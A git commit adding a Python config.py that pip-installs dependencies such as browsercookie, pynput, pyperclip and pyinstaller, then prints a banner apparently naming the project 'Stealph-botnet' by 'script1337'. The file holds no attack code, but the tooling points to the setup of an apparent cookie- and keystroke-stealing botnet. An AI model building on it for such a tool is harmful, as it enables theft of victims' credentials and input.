bbbd37b2592227fc353dde4f23c5a0f3dc4455e6
ScRiPt1337 <26287773+ScRiPt1337@users.noreply.github.com>
2018-10-03 10:33:40 -0700

    config

---
+++ config.py
@@ -0,0 +1,31 @@
+import os
+os.system("C:\Python27\Scripts\pip.exe install pyinstaller")
+os.system("C:\Python27\Scripts\pip.exe install simplejson")
+os.system("C:\Python27\Scripts\pip.exe install pyperclip")
+os.system("C:\Python27\Scripts\pip.exe install browsercookie")
+os.system("C:\Python27\Scripts\pip.exe install pynput")
+os.system("C:\Python27\Scripts\pip.exe install requests")
+os.system("C:\Python27\Scripts\pip.exe install urllib")
+os.system("C:\Python27\Scripts\pip.exe install ctypes")
+os.system("C:\Python27\Scripts\pip.exe install sqlite3")
+os.system("C:\Python27\Scripts\pip.exe install urllib")
+os.system("C:\Python27\Scripts\pip install pypiwin32")
+os.system("C:\Python27\Scripts\pip install logging")
+os.system("cls")
+print """
+
+
+
+  _________ __                .__         .__             ___.           __                 __   
+ /   _____//  |_  ____ _____  |  | ______ |  |__          \_ |__   _____/  |_  ____   _____/  |_ 
+ \_____ \\\   __\/ __\\\\__  \ |  | \____ \|  |  \   ______ | __ \ /  _ \   __\/    \_/ __ \   _\\
+ /        \|  | \  ___/ / __ \|  |_|  |_> >   Y  \ /_____/ | \_\ (  <_> )  | |   |  \  ___/|  |  
+/_______  /|__|  \___  >____  /____/   __/|___|  /         |___  /\____/|__| |___|  /\___  >__|  
+        \/           \/     \/     |__|        \/              \/                 \/     \/  
+        
+            
+                                                                      coded by : script1337
+                                                                      page link : https://www.facebook.com/script1337/   
+                                                                                               
+                                                                                                
+"""
